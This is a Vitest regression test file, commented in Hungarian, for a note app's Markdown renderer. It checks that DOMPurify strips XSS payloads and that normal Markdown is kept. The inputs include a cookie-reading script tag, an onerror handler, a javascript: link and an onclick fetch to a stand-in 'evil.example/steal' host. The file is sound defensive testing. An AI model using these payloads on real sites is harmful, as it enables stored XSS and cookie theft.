import { describe, expect, it } from "vitest";

import { renderMarkdown } from "@/lib/markdown";

// ============================================================================
// Biztonsági regressziós tesztek: a jegyzet-tartalom Markdown→HTML
// renderelése DOMPurify-jal sanitizál (lib/markdown.ts), mert a jegyzetek
// felhő-szinkronon és JSON-import backupon keresztül IS a felhasználó
// böngészőjébe kerülhetnek, nem csak közvetlen gépeléssel — ez tehát valódi
// tárolt XSS elleni védelem, nem csak elméleti "self-XSS" kockázat.
// ============================================================================

describe("renderMarkdown — XSS-védelem", () => {
  it("teljesen eltávolítja a <script> tag-eket", () => {
    const html = renderMarkdown('<script>alert(document.cookie)</script> szöveg');
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert(");
    expect(html).toContain("szöveg");
  });

  it("eltávolítja az esemény-handler attribútumokat (pl. onerror)", () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)">');
    expect(html).not.toContain("onerror");
    expect(html).not.toContain("alert(");
  });

  it("eltávolítja a javascript: séma linkeket", () => {
    const html = renderMarkdown("[kattints ide](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
    expect(html).toContain("kattints ide");
  });

  it("eltávolítja az inline esemény-handlereket tartalmazó egyéb elemeket is", () => {
    const html = renderMarkdown('<div onclick="fetch(\'https://evil.example/steal\')">szia</div>');
    expect(html).not.toContain("onclick");
    expect(html).not.toContain("evil.example");
  });
});

describe("renderMarkdown — normál Markdown továbbra is helyesen renderel", () => {
  it("üres/whitespace bemenetre üres stringet ad", () => {
    expect(renderMarkdown("")).toBe("");
    expect(renderMarkdown("   \n  ")).toBe("");
  });

  it("fejléceket, kiemelést és inline kódot helyesen alakít HTML-lé", () => {
    const html = renderMarkdown("# Cím\n\n**Fontos** szöveg és `kód`.");
    expect(html).toContain("<h1>Cím</h1>");
    expect(html).toContain("<strong>Fontos</strong>");
    expect(html).toContain("<code>kód</code>");
  });

  it("megtartja a biztonságos https:// linkeket", () => {
    const html = renderMarkdown("[UniNotes](https://example.com)");
    expect(html).toContain('href="https://example.com"');
  });

  it("megtartja a data:image/ URI-kat (beágyazott képekhez)", () => {
    const html = renderMarkdown("![kép](data:image/png;base64,AAAA)");
    expect(html).toContain('src="data:image/png;base64,AAAA"');
  });
});
